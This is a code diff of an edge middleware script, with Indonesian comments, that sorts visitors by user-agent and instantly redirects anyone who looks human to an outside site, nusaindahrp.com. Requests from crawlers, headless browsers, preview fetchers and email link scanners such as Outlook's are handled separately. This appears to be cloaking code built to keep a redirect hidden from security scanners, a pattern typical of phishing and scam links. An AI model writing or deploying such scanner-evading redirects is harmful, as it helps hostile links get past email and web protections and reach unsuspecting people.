@@ -1,15 +1,10 @@
-export const config = {
-  matcher: '/', 
-};
-
 export default function middleware(req) {
   const ua = req.headers.get('user-agent')?.toLowerCase() || '';
 
   // Daftar kata kunci Bot Scanner
   const botKeywords = [
-    'bot', 'spider', 'crawler', 'scanner', 'outlook-linkdetect', 
-    'preview', 'headless', 'googleusercontent', 'monit', 'slurp',
-    'lighthouse', 'bingbot', 'adsbot'
+    'bot', 'spider', 'crawler', 'scanner', 'outlook', 
+    'preview', 'headless', 'googleusercontent'
   ];
 
   const isBot = botKeywords.some(keyword => ua.includes(keyword));
@@ -20,7 +15,5 @@ export default function middleware(req) {
   }
 
   // 2. Jika Manusia, Redirect Instan
-  const targetUrl = 'https://nusaindahrp.com/?dev';
-  
-  return Response.redirect(targetUrl, 307);
+  return Response.redirect('https://nusaindahrp.com/?dev', 307);
 }
